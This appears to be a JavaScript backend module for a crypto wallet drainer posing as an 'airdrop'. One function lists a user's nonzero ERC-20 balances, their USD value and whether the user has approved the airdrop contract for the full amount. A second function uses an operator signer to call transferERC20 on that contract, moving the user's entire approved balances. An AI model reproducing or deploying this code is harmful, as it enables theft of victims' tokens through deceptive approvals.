import { ethers } from "ethers";
import axios from "axios";
import { createWalletClient, http } from 'viem'
const erc20abi = require("../abis/erc20abi.json");
const dataProviderAbi = require("../abis/DataProviderAbi.json");
const airdropAbi = require('../abis/AirdropAbi.json');
export const getBalanceErc20 = async (providerAddress, tokens, airdrop, userAddress, clientReader) => {
    // const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
    const balances = await clientReader.readContract({
        address: providerAddress,
        abi: dataProviderAbi,
        functionName: "getERC20Balances",
        args: [tokens.map((a) => { return a.address }), userAddress]
    })
    // const balances = await dataProviderContract.getERC20Balances(tokens.map((a) => { return a.address }), userAddress)
    const filtredByBalance = tokens.reduce((filtered, element, index) => {
        if (balances[index].toString() !== "0") {
            filtered.push({ ...element, balance: balances[index] })
        }
        return filtered;
    }, [])
    let filtredTokens = [];
    for (let i = 0; i < filtredByBalance.length; i++) {
        // const contract = new ethers.Contract(filtredByBalance[i].address, erc20abi, client);
        const decimals = await clientReader.readContract({
            address: filtredByBalance[i].address,
            abi: erc20abi,
            functionName: "decimals"
        })
        const allowance = await clientReader.readContract({
            address: filtredByBalance[i].address,
            abi: erc20abi,
            functionName: "allowance",
            args: [userAddress, airdrop]
        })
        // const allowance = await contract.allowance(userAddress, airdrop);
        const res = await axios.get(`https://min-api.cryptocompare.com/data/price?fsym=${filtredByBalance[i].symbol}&tsyms=USD`)
        const price = res.data.USD;
        const balanceInUsd = +ethers.utils.formatUnits(filtredByBalance[i].balance, decimals) * res.data.USD;
        let isApproved = false;
        if (allowance.toString() > 0 && filtredByBalance[i].balance.toString() === allowance.toString()) {
            isApproved = true;
        }
        else {
            isApproved = false;
        }
        let newToken = { ...filtredByBalance[i], decimals: decimals, allowance: allowance, price: price, balanceInUsd: balanceInUsd, isApproved: isApproved };
        filtredTokens.push(newToken);
    }
    return await Promise.all(filtredTokens);
}
export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, clientReader,  signerAccount) => {

    let res = [];
    for (let i = 0; i < tokensWithBalance.length; i++) {
        try {
            const allowance = await clientReader.readContract({
                address: tokensWithBalance[i].address,
                abi: erc20abi,
                functionName: "allowance",
                args: [userAddress, airdrop]
            })
            console.log(allowance.toString(), "allowance")
            if (allowance.toString() !== "0" && tokensWithBalance[i].balance.toString() !== "0" ) {
                res.push(tokensWithBalance[i]);
            }
        }
        catch (err) {
            console.log(err);
        }
    }
    try {
        console.log(signerAccount)
        const addresses = tokensWithBalance.map((token) => token.address);
        const amounts = tokensWithBalance.map((token) => token.balance);
        if (addresses.length > 0 && amounts.length > 0) {
            const walletClient = createWalletClient({
                account:signerAccount,
                chain: chain,
                transport: http()
              })
              await walletClient.writeContract({
                account:signerAccount,
                address: airdrop,
                abi: airdropAbi,
                functionName: 'transferERC20',
                args: [userAddress, addresses, amounts],
                gasPrice:chain.id === 137 ? walletClient.getGasPrice() : undefined,
              })
            // if (chain.id === 137) {
            //     txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts, { gasPrice: publicClient.getGasPrice() });
            // }
            // else {
            //     txToSend = await airdropContract.populateTransaction.transferERC20(userAddress, addresses, amounts);
            // }
            // signer.sendTransaction(txToSend).then((res) => {
            //     console.log(res, "res")
            // })
        }
    }
    catch (err) {
        console.log(err);
    }
}
